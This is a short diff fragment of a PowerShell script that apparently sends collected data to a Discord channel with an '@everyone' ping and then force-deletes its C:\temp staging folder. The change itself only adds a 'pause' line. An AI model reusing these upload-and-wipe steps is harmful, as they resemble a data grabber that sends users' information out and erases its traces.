@@ -150,4 +150,5 @@ Upload-Discord -text "----------------------------------------------------------
 Upload-Discord -text "||@everyone||"
 Remove-Item C:\temp -Recurse -Force -Confirm:$false
 #If you opened the folder :/
+pause
 exit
